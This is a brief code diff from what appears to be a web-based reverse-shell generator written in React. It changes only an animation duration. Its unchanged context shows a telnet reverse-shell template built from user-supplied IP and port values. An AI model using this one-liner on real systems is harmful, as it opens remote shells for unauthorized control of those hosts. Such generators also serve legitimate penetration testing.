@@ -41,7 +41,7 @@ export default (props) => {
   mkfifo $TF && telnet ${values.ip} ${values.port} 0<$TF | /bin/sh 1>$TF
   `;
   return (
-    <QueueAnim delay={300} duration={1000}>
+    <QueueAnim delay={300} duration={1500}>
       <Title
         variant='Title level={3}'
         style={{ fontWeight: "bold", margin: 15 }}
